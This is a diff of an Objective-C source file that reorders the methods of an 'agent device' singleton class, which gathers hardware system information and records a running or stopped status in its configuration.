@@ -63,15 +63,15 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
   return self;
 }
 
-- (id)retain
-{
-  return self;
-}
-
 - (unsigned)retainCount
 {
   // Denotes an object that cannot be released
   return UINT_MAX;
+}
+
+- (id)retain
+{
+  return self;
 }
 
 - (void)release
@@ -88,6 +88,22 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
 #pragma mark Agent Formal Protocol Methods
 #pragma mark -
 
+- (BOOL)getDeviceInfo
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSData *infoStr = [self getSystemInfoWithType: kSPHardwareDataType];
+  
+  if (infoStr != nil)
+    [self writeDeviceInfo: infoStr];
+  
+  [infoStr release];
+  
+  [pool release];
+  
+  return YES;
+}
+
 - (NSData*)getSystemInfoWithType: (NSString*)aType
 {
   NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
@@ -95,7 +111,7 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
   NSData *retData = nil;
   NSString *systemInfoStr = nil;
   NSDictionary *hwDict;
-
+  
 #ifdef DEBUG_DEVICE
   NSLog(@"%s: running device info with type: %@", __FUNCTION__, aType);
 #endif
@@ -224,35 +240,6 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
   return YES;
 }
 
-- (BOOL)getDeviceInfo
-{
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  NSData *infoStr = [self getSystemInfoWithType: kSPHardwareDataType];
-  
-  if (infoStr != nil)
-    [self writeDeviceInfo: infoStr];
-  
-  [infoStr release];
-  
-  [pool release];
-  
-  return YES;
-}
-
-- (void)start
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
-  
-  [self getDeviceInfo];
-  
-  [mAgentConfiguration setObject: AGENT_STOPPED
-                          forKey: @"status"];
-  [outerPool release];
-}
-
 - (BOOL)stop
 {
   int internalCounter = 0;
@@ -270,6 +257,19 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
   return YES;
 }
 
+- (void)start
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
+  
+  [self getDeviceInfo];
+  
+  [mAgentConfiguration setObject: AGENT_STOPPED
+                          forKey: @"status"];
+  [outerPool release];
+}
+
 - (BOOL)resume
 {
   return YES;
@@ -279,6 +279,11 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
 #pragma mark Getter/Setter
 #pragma mark -
 
+- (NSMutableDictionary *)mAgentConfiguration
+{
+  return mAgentConfiguration;
+}
+
 - (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
 {
   if (aConfiguration != mAgentConfiguration)
@@ -286,11 +291,6 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
     [mAgentConfiguration release];
     mAgentConfiguration = [aConfiguration retain];
   }
-}
-
-- (NSMutableDictionary *)mAgentConfiguration
-{
-  return mAgentConfiguration;
 }
 
 @end
